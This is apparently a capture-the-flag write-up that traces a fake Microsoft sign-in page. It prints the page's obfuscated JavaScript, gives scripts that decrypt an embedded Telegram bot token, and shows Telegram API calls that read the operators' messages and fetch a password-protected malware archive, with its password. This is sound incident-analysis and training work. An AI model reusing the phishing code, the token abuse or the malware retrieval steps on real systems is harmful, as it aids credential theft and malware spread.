## Paper Airplane ##

## 1. Analysis ##
* **Given:** an url to Microsoft-look-alike `https://dboard.bksec.vn/1
* **Description:** Just a paper airplane.

* **Hints:**   
    * No hints are given

## 2. Investigation ##
### The website phase ###

![](Screenshot_2026-03-08_062551.png)

At first, I thought that this is a web chal since this is the first time I did a forensics chal in website.
Looked at the **Source**, I saw a suspicious file named `(index)`:
```html

    <!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8"/>
        <meta name="viewport" content="width=device-width,initial-scale=1"/>
        <title>Sign in to your account</title>
        <style>
            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0
            }

            body {
                background: #f2f2f2;
                font-family: 'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center
            }

        ...
            function _0x3672() {
                var _0x6e65cc = ['mhvIm0PU', 'C3bSAxq', 'y2HHDf9Pza', 'ExnXwMC', 'zgfYAW', 'vMvOyLC', 'yMz5zgy', 'yxbWBhK', 'vujbqMC', 'BK1rEuC', 'x2DH', 'CMfUzg9T', 'mZuZnZK5mKjXse9yqq', 'rgzZqMy', 'CfDwtNO', 'E30Uy29UC3rYDq', 'r1Lczfq', 'D29pu2i', 'Bg9N', 'BMn0Aw9UkcKG', 'vuLqthC', 'BM93', 'Cfz0DMK', 'AMHiBuq', 'AMfgsM4', 'whr1Awm', 'z2LUlM1Py3jVCW', 'DMfSDwu', 'BMTOy1C', 'zxHJzxb0Aw9U', 'Aw5MBW', 'tKv4ywq', 'AgzKCha', 'tereEum', 'qNLjza', 'C2KTza', 'CKDVvLC', 'Ce1SwLi', 'rMnJuNa', 'ufP0tK4', 'sw1Wsge', 'm3WYFdf8nhWW', 'vueTmdaWmdaWlq', 'ugXLyxnLigvUDa', 'sw9KwhG', 'sNDMyvm', 'CMzQBNu', 'qMvtz0O', 'AffWwNa', 'u0HkDfy', 'Dg9tDhjPBMC', 'Dw91D3q', 'C3n3B3jKlG', 'te5Hsva', 'rhL4Dfi', 'shDmrLG', 'rfPxquu', 'qvvcvMi', 'pgi+w1bHCgvYqq', 'svf2rvu', 'CMv0DxjUicHMDq', 'z0zkBve', 'C3rYAw5NAwz5', 'sxzUwg8', 'z1rwy1K', 'wuXfqNi', 'nJyYm0HYu0XmDG', 't0XRuhu', 'yJ4k', 'zwXgq0q', 'C2nYAxb0', 'y29VA2LL', 'C2KTzq', 'C2KTyG', 'Fdr8mhWXma', 'yJ4G', 'DLz5AhC', 'AKHwD0i', 'vKP5DwG', 'B0DktMi', 'B3vXugG', 'qMPruhK', 'CfvxBKO', 'zLLwrxm', 'uNbvAg4', 'zxHTuhi', 'EKf2rK0', 'nda4mtmWrKLcuMrs', 'wNvQsxa', 'z2v0rwXLBwvUDa', 'Afnqy0G', 'BxbSCwS', 'rhfIDvC', 'u25qCwS', 'CM4GDgHPCYiPka', 'BgLKigvTywLSia', 'wMrgwgO', 'AxjWBgfUzv08lW', 'C2zKEfe', 'u3rsEvG', 'wuzktKi', 'ExrPy3m', 'uufNqNG', 'DNrXA04', 'vvnvDfO', 'y29UC3rYDwn0BW', 'Dgv4DenVBNrLBG', 'vwrUqNe', 'C2KTCa', 'wg95uuu', 'ALrPq20', 'AgfPrLm', 'BhjPzwC', 'Bg9JywXtDg9Yyq', 'AfHjChm', 'ChjLDMvUDerLzG', 'C2v0qxr0CMLIDq', 's0rXr04', 'qLLwB1G', 't0jKr1y', 'EMzpwgq', 'vu1pBLK', 'A3DfBMO', 'qM96v2e', 'Dgv4Da', 'wgXWt1G', 'zurWuxi', 'AeL4ANm', 'z2DRreS', 'tgT0Dg0', 'yuHsmgnittzmEq', 'DKrJrfi', 's0XPuvO', 'owHJr2T1', 'yM9KEq', 'zvr3D3O', 'mxWWFdr8nxWZFa', 'q1btsfG', 'C2KTDa', 'y2f0y2G', 'qvbIChq', 'u2LNBIbPBG', 'CMflChC', 'mhWZFdv8nhWXFa', 'qw5tCgC', 'Bg9JyxrPB24', 'DfDtCuy', 'CfvOzwe', 'zuLrzLO', 'rhfmrxK', 'u2DqwvC', 'C3r5Bgu', 'sNDqzMe', 'nxWXm3WXmxWXnq', 'CNLTyKu', 'tKLNwwG', 'zNPMsLy', 'uvrXtem', 'q29UDgvUDc1uEq', 'Ahr0Chm6lY93DW', 'sNDswge', 'EuDnrfC', 'wwrSEue', 'tfrlA1e', 'rg5nzwC', 'zxjYB3i', 'AhnOB3u', 'sfrnta', 'zMLSBa', 'B2z0B25SAw5LlG', 'uNvXDuO', 'zgLZywjSzwq', 'v1r3wMS', 'u25NzNi', 'r1z0vgG', 'l2i+ia', 'zNjVBunOyxjdBW', 'svLUtw0', 'CgfYC2vFBw9Kzq', 'mNWWFdv8m3W0Fa', 'qNHHug4', 'mtC3mZaWnevHswf0zW', 'AM9PBG', 'zuDKyLa', 'sMvNCu4', 'tevdyKK', 'C3jJ', 'C3vIBwL0', 'qujHs3m', 'zgLZCgXHEq', 'sKftDu8', 'CNnNDNe', 'DgHLBwu', 'A2v5', 'DxnLCKfNzw50', 'weHAvw0', 'C1nQAKm', 't3rMzgO', 'Cu9Qq1e', 'Cvblu1y', 'mxW0Fdj8nxWWFa', 'ALrOuKK', 'vfnUwu4', 'BI9QC29U', 'qwX6vMu', 'C2vZC2LVBLn0BW', 'BM9Uzq', 'B1fTCwO', 'twj6uKq', 'C2KTDq', 'yMXVy2S', 'DNH2D1y', 'C3rLBMvY', 'rfvgsgK', 'wvj0Aey', 'tfDZDNe', 'mNWXFdr8mhWZ', 'q3rSDhe', 'ywrKrxzLBNrmAq', 'qwvpDMK', 'EwHbzwm', 'vxjyA3O', 'ChvZAa', 'vKH5qMq', 'nZGXodCWnMX2ANfQqG', 'yKL2qxu', 'z0fvqwO', 'zM9JDxm', 'uM13vg0', 'C2v0', 'yxbWBgLJyxrPBW', 'DgfIBgu', 'y3jLyxrLrwXLBq', 'mJKXmZu5oeLIrxDPvG', 'wKnxD2i', 'CIWGB3iGu2T5Ca', 'q3z6CfO', 'tMrSzgS', 'rfDyrhO', 'mtHysvrvAwm', 'AgvHzgvYCW', 'CLDwzxe', 'wKXerg4', 'CKH3Ahe', 'z1zfBuC', 'z2v0sxrLBq', 'ugfNsNO', 'D2jKrw8', 'ChjVDg90ExbL', 'zLjQugS', 'EuvIwMm', 'zxiGEw91CIbWyq', 'A0DXvNu', 'm1LYA1rcAW', 'y29UC29Szq', 'm3W1Fdr8mhWYFa', 'vxvQAvO', 'twfyCu8', 'ugT6suO', 'qKXxCg4', 'rw50zxiGysb2yq', 'sMHswMq', 'svfpvuG', 'CKvhAwG', 'BgvUz3rO', 'uhvuthu', 'C2HPzNq', 'DuDiAwK', 'wvHfwhe', 'odrhzfzqBgC', 'sNfhtxe', 'yMzAC0O', 'zgf0ys10AgvTzq', 'D2TxCe0', 'Dvj1tuO', 'vLn2qNq', 'CgnXy3G', 'z2vjrxK', 'ufrxtLe', 'q25LwvO', 'ENDlvxK', 'qKvmA1a', 'zw50', 'y29Uy2f0', 'qNvgruO', 'uMH1Egm', 'q0zbDvu', 'yMLUza', 'rgDTuLe', 'uLzyB08', 'BMTVwMq', 'ywXMyKi', 'vg9kA3e', 'r1vdzg4', 'CMvTB3zLsxrLBq', 'rejKCxa', 's1vRrNO', 'vhjHsNq', 'uhjtrMK', 'BKX5zNi', 'zgjQq0u', 'C2vJ', 'tMvjDKK', 'sMDpENO', 'D2fYBG', 'r0nhA0i', 'yMztAhy', 'DwPItMG', 'EfrVq2K', 'C2KTC3a', 'wwHytNK', 'D3nHreu', 'y3rVCIGICMv0Dq', 'z2fmELC', 'Dez2q3K', 'wLD1Bee', 'x19ZDa', 'wvHTwu0', 'Bvr5yKy', 'vxHAvLC', 'vNjptee', 'ALfMtKS', 'EwDzAgW', 'BwfW', 'C2v0sxrLBq', 'sLnMt28', 'yxn5BMm', 'rhDwCwS', 'r2LVvKO', 'CujpBgm', 'y2HHCKnVzgvbDa', 'tNPzv2rS', 'mNWXFdr8nxWZFa', 'EwjIAKK', 'serRAeO', 'vxfowLi', 'yNLowvq', 'wendswC', 'C0zZuwe', 'vM15r1u', 'tdnoBgjTuK5Awa', 'Fdz8oxW4Fde0Fa', 'Ag9UzsbUDw1Izq', 'mZqXnJu1mdbwD0fTzuS', 'rezdruO', 'qxPxBuS', 'yuDitgC', 'rw50zxiGCgfZCW', 'qND1ruS', 'pgi+vue6pc9IpG', 'BLvmvKS', 'EhzHwfm', 'EhrrDMi', 'swDwtvm', 'yLjWzwK', 'Auj0zNK', 'zKPvvKy', 'tg5yvfm', 'vejfEeG', 'uM95D0e', 'C2KTzG', 'ywrKCMvZCYWGCa', 'qxfntgC', 'DhjHy2u', 'lMPZ', 'C050zva', 'CgfeA04', 'z1Ldz00', 'ANnVBG'];
                _0x3672 = function() {
                    return _0x6e65cc;
                }
                ;
                return _0x3672();
            }
        </script>
        <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"da058bb71e544ef0859a788e8d4bcd3c","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
    </body>
</html>
```

After some investigations and searchings, I found that this web related to a malware campaign stealing usernames and passwords. I uncovered a leaked `Telegram Bot Token` embedded within the site's components in strings such as `dGVsZWdyYW` which base64 -d will becomes `telegra`.

I tried to copy the file to my computer to test, since I know if i sent a submit, in the **network** tab, it will have a request look like this `https://api.telegram.org/bot<BOT_TOKEN>/sendMessage`, however when i tested, the console log declare fault.

So I try a new way:
1. Turn on a new tab, type `about:blank` in the address
2. I paste this script in the `console`:
```java
// 1. Decoded Array
var _0x6e65cc = ['mhvIm0PU', 'C3bSAxq', 'y2HHDf9Pza', 'ExnXwMC', 'zgfYAW', 'vMvOyLC', 'yMz5zgy', 'yxbWBhK', 'vujbqMC', 'BK1rEuC', 'x2DH', 'CMfUzg9T', 'mZuZnZK5mKjXse9yqq', 'rgzZqMy', 'CfDwtNO', 'E30Uy29UC3rYDq', 'r1Lczfq', 'D29pu2i', 'Bg9N', 'BMn0Aw9UkcKG', 'vuLqthC', 'BM93', 'Cfz0DMK', 'AMHiBuq', 'AMfgsM4', 'whr1Awm', 'z2LUlM1Py3jVCW', 'DMfSDwu', 'BMTOy1C', 'zxHJzxb0Aw9U', 'Aw5MBW', 'tKv4ywq', 'AgzKCha', 'tereEum', 'qNLjza', 'C2KTza', 'CKDVvLC', 'Ce1SwLi', 'rMnJuNa', 'ufP0tK4', 'sw1Wsge', 'm3WYFdf8nhWW', 'vueTmdaWmdaWlq', 'ugXLyxnLigvUDa', 'sw9KwhG', 'sNDMyvm', 'CMzQBNu', 'qMvtz0O', 'AffWwNa', 'u0HkDfy', 'Dg9tDhjPBMC', 'Dw91D3q', 'C3n3B3jKlG', 'te5Hsva', 'rhL4Dfi', 'shDmrLG', 'rfPxquu', 'qvvcvMi', 'pgi+w1bHCgvYqq', 'svf2rvu', 'CMv0DxjUicHMDq', 'z0zkBve', 'C3rYAw5NAwz5', 'sxzUwg8', 'z1rwy1K', 'wuXfqNi', 'nJyYm0HYu0XmDG', 't0XRuhu', 'yJ4k', 'zwXgq0q', 'C2nYAxb0', 'y29VA2LL', 'C2KTzq', 'C2KTyG', 'Fdr8mhWXma', 'yJ4G', 'DLz5AhC', 'AKHwD0i', 'vKP5DwG', 'B0DktMi', 'B3vXugG', 'qMPruhK', 'CfvxBKO', 'zLLwrxm', 'uNbvAg4', 'zxHTuhi', 'EKf2rK0', 'nda4mtmWrKLcuMrs', 'wNvQsxa', 'z2v0rwXLBwvUDa', 'Afnqy0G', 'BxbSCwS', 'rhfIDvC', 'u25qCwS', 'CM4GDgHPCYiPka', 'BgLKigvTywLSia', 'wMrgwgO', 'AxjWBgfUzv08lW', 'C2zKEfe', 'u3rsEvG', 'wuzktKi', 'ExrPy3m', 'uufNqNG', 'DNrXA04', 'vvnvDfO', 'y29UC3rYDwn0BW', 'Dgv4DenVBNrLBG', 'vwrUqNe', 'C2KTCa', 'wg95uuu', 'ALrPq20', 'AgfPrLm', 'BhjPzwC', 'Bg9JywXtDg9Yyq', 'AfHjChm', 'ChjLDMvUDerLzG', 'C2v0qxr0CMLIDq', 's0rXr04', 'qLLwB1G', 't0jKr1y', 'EMzpwgq', 'vu1pBLK', 'A3DfBMO', 'qM96v2e', 'Dgv4Da', 'wgXWt1G', 'zurWuxi', 'AeL4ANm', 'z2DRreS', 'tgT0Dg0', 'yuHsmgnittzmEq', 'DKrJrfi', 's0XPuvO', 'owHJr2T1', 'yM9KEq', 'zvr3D3O', 'mxWWFdr8nxWZFa', 'q1btsfG', 'C2KTDa', 'y2f0y2G', 'qvbIChq', 'u2LNBIbPBG', 'CMflChC', 'mhWZFdv8nhWXFa', 'qw5tCgC', 'Bg9JyxrPB24', 'DfDtCuy', 'CfvOzwe', 'zuLrzLO', 'rhfmrxK', 'u2DqwvC', 'C3r5Bgu', 'sNDqzMe', 'nxWXm3WXmxWXnq', 'CNLTyKu', 'tKLNwwG', 'zNPMsLy', 'uvrXtem', 'q29UDgvUDc1uEq', 'Ahr0Chm6lY93DW', 'sNDswge', 'EuDnrfC', 'wwrSEue', 'tfrlA1e', 'rg5nzwC', 'zxjYB3i', 'AhnOB3u', 'sfrnta', 'zMLSBa', 'B2z0B25SAw5LlG', 'uNvXDuO', 'zgLZywjSzwq', 'v1r3wMS', 'u25NzNi', 'r1z0vgG', 'l2i+ia', 'zNjVBunOyxjdBW', 'svLUtw0', 'CgfYC2vFBw9Kzq', 'mNWWFdv8m3W0Fa', 'qNHHug4', 'mtC3mZaWnevHswf0zW', 'AM9PBG', 'zuDKyLa', 'sMvNCu4', 'tevdyKK', 'C3jJ', 'C3vIBwL0', 'qujHs3m', 'zgLZCgXHEq', 'sKftDu8', 'CNnNDNe', 'DgHLBwu', 'A2v5', 'DxnLCKfNzw50', 'weHAvw0', 'C1nQAKm', 't3rMzgO', 'Cu9Qq1e', 'Cvblu1y', 'mxW0Fdj8nxWWFa', 'ALrOuKK', 'vfnUwu4', 'BI9QC29U', 'qwX6vMu', 'C2vZC2LVBLn0BW', 'BM9Uzq', 'B1fTCwO', 'twj6uKq', 'C2KTDq', 'yMXVy2S', 'DNH2D1y', 'C3rLBMvY', 'rfvgsgK', 'wvj0Aey', 'tfDZDNe', 'mNWXFdr8mhWZ', 'q3rSDhe', 'ywrKrxzLBNrmAq', 'qwvpDMK', 'EwHbzwm', 'vxjyA3O', 'ChvZAa', 'vKH5qMq', 'nZGXodCWnMX2ANfQqG', 'yKL2qxu', 'z0fvqwO', 'zM9JDxm', 'uM13vg0', 'C2v0', 'yxbWBgLJyxrPBW', 'DgfIBgu', 'y3jLyxrLrwXLBq', 'mJKXmZu5oeLIrxDPvG', 'wKnxD2i', 'CIWGB3iGu2T5Ca', 'q3z6CfO', 'tMrSzgS', 'rfDyrhO', 'mtHysvrvAwm', 'AgvHzgvYCW', 'CLDwzxe', 'wKXerg4', 'CKH3Ahe', 'z1zfBuC', 'z2v0sxrLBq', 'ugfNsNO', 'D2jKrw8', 'ChjVDg90ExbL', 'zLjQugS', 'EuvIwMm', 'zxiGEw91CIbWyq', 'A0DXvNu', 'm1LYA1rcAW', 'y29UC29Szq', 'm3W1Fdr8mhWYFa', 'vxvQAvO', 'twfyCu8', 'ugT6suO', 'qKXxCg4', 'rw50zxiGysb2yq', 'sMHswMq', 'svfpvuG', 'CKvhAwG', 'BgvUz3rO', 'uhvuthu', 'C2HPzNq', 'DuDiAwK', 'wvHfwhe', 'odrhzfzqBgC', 'sNfhtxe', 'yMzAC0O', 'zgf0ys10AgvTzq', 'D2TxCe0', 'Dvj1tuO', 'vLn2qNq', 'CgnXy3G', 'z2vjrxK', 'ufrxtLe', 'q25LwvO', 'ENDlvxK', 'qKvmA1a', 'zw50', 'y29Uy2f0', 'qNvgruO', 'uMH1Egm', 'q0zbDvu', 'yMLUza', 'rgDTuLe', 'uLzyB08', 'BMTVwMq', 'ywXMyKi', 'vg9kA3e', 'r1vdzg4', 'CMvTB3zLsxrLBq', 'rejKCxa', 's1vRrNO', 'vhjHsNq', 'uhjtrMK', 'BKX5zNi', 'zgjQq0u', 'C2vJ', 'tMvjDKK', 'sMDpENO', 'D2fYBG', 'r0nhA0i', 'yMztAhy', 'DwPItMG', 'EfrVq2K', 'C2KTC3a', 'wwHytNK', 'D3nHreu', 'y3rVCIGICMv0Dq', 'z2fmELC', 'Dez2q3K', 'wLD1Bee', 'x19ZDa', 'wvHTwu0', 'Bvr5yKy', 'vxHAvLC', 'vNjptee', 'ALfMtKS', 'EwDzAgW', 'BwfW', 'C2v0sxrLBq', 'sLnMt28', 'yxn5BMm', 'rhDwCwS', 'r2LVvKO', 'CujpBgm', 'y2HHCKnVzgvbDa', 'tNPzv2rS', 'mNWXFdr8nxWZFa', 'EwjIAKK', 'serRAeO', 'vxfowLi', 'yNLowvq', 'wendswC', 'C0zZuwe', 'vM15r1u', 'tdnoBgjTuK5Awa', 'Fdz8oxW4Fde0Fa', 'Ag9UzsbUDw1Izq', 'mZqXnJu1mdbwD0fTzuS', 'rezdruO', 'qxPxBuS', 'yuDitgC', 'rw50zxiGCgfZCW', 'qND1ruS', 'pgi+vue6pc9IpG', 'BLvmvKS', 'EhzHwfm', 'EhrrDMi', 'swDwtvm', 'yLjWzwK', 'Auj0zNK', 'zKPvvKy', 'tg5yvfm', 'vejfEeG', 'uM95D0e', 'C2KTzG', 'ywrKCMvZCYWGCa', 'qxfntgC', 'DhjHy2u', 'lMPZ', 'C050zva', 'CgfeA04', 'z1Ldz00', 'ANnVBG'];
function _0x3672() { return _0x6e65cc; }

// 2. Array Shifting
(function(_0x3a3bf8, _0x43f38c) {
    function _0xde07c7(_0x347957, _0x5770a0, _0x2cb114, _0x307e0c) { return _0x49af(_0x5770a0 - -0x248, _0x2cb114); }
    var _0x3fe028 = _0x3a3bf8();
    function _0x857724(_0x1d7552, _0x11d439, _0x26928f, _0x3e8083) { return _0x49af(_0x11d439 - 0x300, _0x1d7552); }
    while (!![]) {
        try {
            var _0x38bc0a = parseInt(_0x857724(0x4f3, 0x551, 0x54c, 0x5c3)) / (0x408 + -0x985 + 0x57e) + parseInt(_0x857724(0x6a5, 0x5f8, 0x5b0, 0x5d8)) / (-0x114 * -0x16 + 0x16a4 + -0x2e5a) + -parseInt(_0xde07c7(0xd, 0xc4, 0x4c, 0xf3)) / (-0x1e5e + 0x2 * 0x53 + 0x1dbb) * (parseInt(_0x857724(0x611, 0x5c4, 0x5e8, 0x632)) / (0xc06 + 0x1 * -0x1009 + 0x407)) + -parseInt(_0x857724(0x61d, 0x566, 0x5ef, 0x554)) / (0xd * -0x298 + 0x844 + 0x1979) * (-parseInt(_0x857724(0x64d, 0x61c, 0x62f, 0x685)) / (0x9fd * -0x2 + -0x624 * 0x3 + 0x266c)) + parseInt(_0xde07c7(0x118, 0xa7, 0xe4, 0x112)) / (0x2106 * 0x1 + 0x7d8 * 0x2 + 0x1 * -0x30af) + parseInt(_0xde07c7(-0xcb, -0x2d, -0xd5, -0x34)) / (-0x2c * -0x1d + 0xdb6 + 0x2 * -0x955) * (parseInt(_0x857724(0x699, 0x5fe, 0x5cb, 0x6a3)) / (0x3 * 0x462 + 0x8ff + -0x236 * 0xa)) + -parseInt(_0x857724(0x443, 0x4f5, 0x5a4, 0x4c2)) / (-0x1 * 0xb57 + -0x69 * -0x16 + -0x1 * -0x25b);
            if (_0x38bc0a === _0x43f38c) break;
            else _0x3fe028['push'](_0x3fe028['shift']());
        } catch (_0x327a9c) {
            _0x3fe028['push'](_0x3fe028['shift']());
        }
    }
}(_0x3672, 0x1 * 0x145889 + -0x1 * -0x3ee76 + 0x449ea * -0x3));

// 3. Decode Base64 + RC4
function _0x49af(_0x4bdb35, _0x6c2705) {
    _0x4bdb35 = _0x4bdb35 - (0x1438 + 0x67 * 0x1d + -0x1dfb);
    var _0x34328f = _0x3672();
    var _0x159f4c = _0x34328f[_0x4bdb35];
    if (_0x49af['tuKZGr'] === undefined) {
        var _0x5680a2 = function(_0x587a7f) {
            var _0x1a0188 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            var _0x233d39 = '', _0xc58b2f = '';
            for (var _0x30a1b7 = 0x58a + 0x154d + -0x1ad7, _0x47f380, _0x4fc880, _0x5d8ade = 0x9f6 + -0x228d + -0x4eb * -0x5; _0x4fc880 = _0x587a7f['charAt'](_0x5d8ade++); ~_0x4fc880 && (_0x47f380 = _0x30a1b7 % (-0xf2a + 0x131c + -0x1f7 * 0x2) ? _0x47f380 * (0x268b + -0xde8 * -0x2 + -0x421b) + _0x4fc880 : _0x4fc880, _0x30a1b7++ % (-0xd * -0x301 + -0x1 * 0x1a09 + 0x4 * -0x340)) ? _0x233d39 += String['fromCharCode'](-0x14 * -0x115 + 0xce2 * 0x1 + 0x3 * -0xb2d & _0x47f380 >> (-(0x946 + -0x112 * -0x1 + 0x372 * -0x3) * _0x30a1b7 & -0x1 * 0x93a + -0x1 * -0x4e3 + -0x45d * -0x1)) : -0x2147 + -0x1c6a + -0x11 * -0x3a1) {
                _0x4fc880 = _0x1a0188['indexOf'](_0x4fc880);
            }
            for (var _0xd8f8a5 = 0x4c5 + -0x322 * 0x5 + 0xae5, _0x302332 = _0x233d39['length']; _0xd8f8a5 < _0x302332; _0xd8f8a5++) {
                _0xc58b2f += '%' + ('00' + _0x233d39['charCodeAt'](_0xd8f8a5)['toString'](0x11c7 + 0x10 * 0x1c7 + -0x2e27 * 0x1))['slice'](-(-0x1 * -0xcfe + 0x1a6 * 0x2 + -0x1048));
            }
            return decodeURIComponent(_0xc58b2f);
        };
        _0x49af['EAxItQ'] = _0x5680a2, _0x49af['WobrTC'] = {}, _0x49af['tuKZGr'] = !![];
    }
    var _0x42f795 = _0x34328f[-0x5d1 * -0x5 + 0x95b + -0x2670], _0x186bb4 = _0x4bdb35 + _0x42f795, _0x19b74d = _0x49af['WobrTC'][_0x186bb4];
    return !_0x19b74d ? (_0x159f4c = _0x49af['EAxItQ'](_0x159f4c), _0x49af['WobrTC'][_0x186bb4] = _0x159f4c) : _0x159f4c = _0x19b74d, _0x159f4c;
}

// 4. Bruteforce Dump
let dumpedStrings = [];
for(let i = 0; i < 2000; i++) {
    try {
        let str = _0x49af(i);
        if(str && typeof str === 'string' && str.trim() !== '') {
            dumpedStrings.push(`[Chỉ số ${i}]: ${str}`);
        }
    } catch(e) {}
}
console.log(dumpedStrings.join('\n'));
```

The output has some readable strings but still not have the `BOT_ID`, looked back at the website sourcecode, there are 2 functions using a lots mathematical operations, the browser will automatically calculate these numbers, convert them into ASCII code, and translate them back into characters at runtime. Moreover, there is a function called `_0xe9`. This function is actually the RC4 encryption algorithm. The author used the Chat ID as the Key to encrypt the Bot Token. Therefore I have another script:

```java
// 1. Chat ID decryption
function getChatID() {
    var arr1 = [0x2 * -0xc61 + 0x536 + 0x13bc, -0x1 * 0x1c62 + -0x28f * -0x2 + -0x25 * -0xa4, 0x7 * -0x45d + -0x201c + -0x64e * -0xa, 0x6ee + -0x3 * 0x16f + -0x22f];
    var arr2 = [-0xf57 + 0x830 * -0x4 + 0x40a * 0xc, 0x2179 + -0xf * -0x20c + 0xb * -0x5cb, -0x2ea * -0x7 + -0x18c5 + 0x10 * 0x49, 0x1027 + 0x29 * 0x91 + -0x26f1];
    var arr3 = [-0x2 * 0x8f9 + -0x1825 + 0x2a85 * 0x1, -0x30 * 0x40 + 0x1 * -0x123b + 0x1e9a, -0x19 * -0x10b + -0x12e6 + -0x1 * 0x6d9, -0x1 * -0x191d + 0x155d + -0x2e26, 0x1d58 + 0x131 * -0x9 + -0x1249];
    return arr1.concat(arr2, arr3).map(function(e) { return String.fromCharCode(e); }).join('');
}

function decryptBotToken() {
    var key = getChatID(); 
    
    // Decrypted Array
    var arr_part1 = [-0x3 * 0x881 + 0x1 * -0x177 + 0x1bf2, 0x248a + 0x159f + -0x3949, 0x6b3 + 0x1a8b + -0x18 * 0x158, 0x173 + -0x5 * -0x602 + -0xa4b * 0x3, -0x11ff * -0x1 + 0x1a21 + -0x2b30, 0x44a + -0x1 * -0x469 + 0x88f * -0x1, -0x11e5 + 0xa92 + 0x798, -0x5 * 0xe6 + -0x1558 + 0x1a77, -0x49 * -0x4f + -0x20c4 + 0xad2, -0x6 * -0x347 + 0x5 * 0x48b + -0x2995, 0x1c13 * -0x1 + 0xe1 + 0x1bcb, 0x15 * -0xda + -0x3ed + 0x1667, -0x119b * 0x2 + 0x1759 * 0x1 + -0x1 * -0xc7f, -0x19f9 * 0x1 + -0x8ec + 0x2328, 0x1 * -0x16a7 + 0x1758 + 0x51 * -0x1, -0x1f6 * 0x1 + -0x191f * 0x1 + 0x1b99, -0xc * 0x57 + -0x18f + 0x672, -0xb * 0x329 + -0x81e + -0x577 * -0x8, 0x1cb7 + 0x825 + -0x241d, 0x75 * 0x1f + -0x9 * -0x252 + -0x226c, 0x5f * -0x3b + -0x1563 + -0x7 * -0x643, -0x14a5 + -0xc5 * -0x5 + -0x8 * -0x21b, 0xc5 * 0x31 + 0x2 * -0xfb6 + -0x1f2 * 0x3, -0x8 * -0x1d4 + 0xd0b + -0x1b5a];
    var arr_part2 = [-0x91 * -0x2d + 0x24e3 + -0x343 * 0x13, 0xc8d + -0x1166 + 0x55c, 0x8 * -0x3cd + -0x17ce + 0x369f, 0x1 * 0x1a8f + 0x17ff + -0x3220, -0x2e * -0x31 + -0x19b9 + 0x11c3, -0x544 * 0x3 + 0xad1 + -0x518 * -0x1, -0xc86 + -0xb3 * -0xe + 0x309, 0x7 * -0x4b5 + 0x783 * -0x1 + -0x295b * -0x1, -0x4d6 + -0x1 * -0x1c69 + -0x1711, 0x28 * 0x1e + -0x1 * -0x25c5 + 0xdee * -0x3, -0x5f * -0xf + -0x147a + 0xfa3, 0x2 * 0x10bb + 0xc + -0x5 * 0x6a1, -0x1b57 + 0x21dc + -0x5ab, -0x2 * 0x2ce + -0x13e7 + 0x6 * 0x447, 0x1 * 0x1b86 + -0x1c4b * 0x1 + 0x12f, 0x2be + 0x5c6 + -0x831, -0x2 * 0xba5 + 0xc * 0x18b + 0x54e, 0xd3e + -0x1e51 * 0x1 + 0x1149, -0x1 * -0xe61 + -0x2024 + 0x12b7, 0x25 * -0x92 + -0x1bb0 + 0x31b4, 0x19c1 + -0x1f * 0xdd + 0x3 * 0x7f, -0xfa4 + 0x25b + 0xdb7 * 0x1];
    
    var cipher = arr_part1.concat(arr_part2);
    
    // 3. RC4 Decryption
    var s = [], j = 0, x, res = '';
    for (var i = 0; i < 256; i++) {
        s[i] = i;
    }
    for (var i = 0; i < 256; i++) {
        j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
        x = s[i];
        s[i] = s[j];
        s[j] = x;
    }
    var i = 0;
    j = 0;
    for (var y = 0; y < cipher.length; y++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        x = s[i];
        s[i] = s[j];
        s[j] = x;
        res += String.fromCharCode(cipher[y] ^ s[(s[i] + s[j]) % 256]);
    }
    return res;
}

console.log("BOT TOKEN: " + decryptBotToken());
```

![](Screenshot_2026-03-08_072238.png)

`BOT TOKEN: 8741821923:AAERavkAGOe6RaEdC2oSRXoF00CXE_iGFew`

Since I have the `Bot Token`, I can use special url to investigate further:
1. `https://api.telegram.org/bot8741821923:AAERavkAGOe6RaEdC2oSRXoF00CXE_iGFew/getMe` to get the information about the bot and its username
2. `https://api.telegram.org/bot8741821923:AAERavkAGOe6RaEdC2oSRXoF00CXE_iGFew/getUpdates` to read the bot's message history. 
    * Note: Here, I found some interesting conversations:
```json
{
      "update_id": 796068787,
      "channel_post": {
        "message_id": 5,
        "sender_chat": {
          "id": -1003756128666,
          "title": "BKSEC_Ops",
          "type": "channel"
        },
        "chat": {
          "id": -1003756128666,
          "title": "BKSEC_Ops",
          "type": "channel"
        },
        "date": 1772894142,
        "text": "still waiting on the payload bro"
      }
    },

    "document": {
          "file_name": "PaperAirplane.rar",
          "mime_type": "application/x-rar-compressed",
          "file_id": "BQACAgUAAyEFAATf4fmaAAMIaaw30_kj3PoKWiFnQGesyWVIHZIAAiofAALCOWFVj4AnSZhFqcw6BA",
          "file_unique_id": "AgADKh8AAsI5YVU",
          "file_size": 563870
        }
    ....
```
In this conversation, an id uploaded a `.rar` named `PaperAirplane.rar`, after that, another person asked `password` and got answered `squirrel!`. Moreover, I found the rar file might have a C2 malware since a person asked `C2 is up on my end?`, and I got some config of the server (which help me solve this chal):
1. port: 3636
2. domain: bksec.airlines

### The payload phase ###

After sneaking on the conversation, I got the file path by this url
`https://api.telegram.org/bot8741821923:AAERavkAGOe6RaEdC2oSRXoF00CXE_iGFew/getFile?file_id=BQACAgUAAyEFAATf4fmaAAMIaaw30_kj3PoKWiFnQGesyWVIHZIAAiofAALCOWFVj4AnSZhFqcw6BA`
which will give me the file path to the .rar by a JSON strings.

And then I download the file `https://api.telegram.org/file/bot8741821923:AAERavkAGOe6RaEdC2oSRXoF00CXE_iGFew/documents/file_0.rar`

Unrar the `file_0.rar` using `squirrel!`, I really got an `.exe` named `PaperAirplane`. I uploaded the file to `VirusTotal`, the result show me this is a malware, nonetheless dont tell me which type of C2 I need to face with.

